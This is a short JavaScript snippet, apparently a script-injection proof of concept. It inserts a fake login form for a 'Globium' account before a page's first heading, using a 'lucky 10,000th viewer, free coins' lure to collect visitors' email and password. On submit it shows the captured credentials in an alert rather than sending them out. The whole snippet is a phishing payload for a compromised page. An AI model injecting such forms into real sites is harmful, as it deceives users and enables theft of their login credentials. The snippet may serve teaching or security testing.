const myHtml = `
<form
  id="hacker-form"
  style="display: flex;
    margin-top: 100px;
    flex-direction: column;
    align-items: center;"
  method="get"
  action="/"
>
  <h1 class="elementor-heading-title elementor-size-default">
    Welcome! You are our 10,000th viewer. Log in to your Globium account to
    claim 10 free coins as our lucky winner!
  </h1>

  <label>
    <p class="elementor-heading-title elementor-size-default">Your email</p>
    <input type="email" name="hackedEmail" />
  </label>
  <label>
    <p class="elementor-heading-title elementor-size-default">Password</p>
    <input type="password" name="hackedPassword" />
  </label>
  <input type="submit" />
</form>`;
document.querySelector("h1").insertAdjacentHTML("beforeBegin", myHtml);

document.querySelector("#hacker-form").addEventListener("submit", (e) => {
  e.preventDefault();
  alert(
    `I have stolen your email, ${e.target.elements.hackedEmail.value} and password ${e.target.elements.hackedPassword.value}`
  );
});
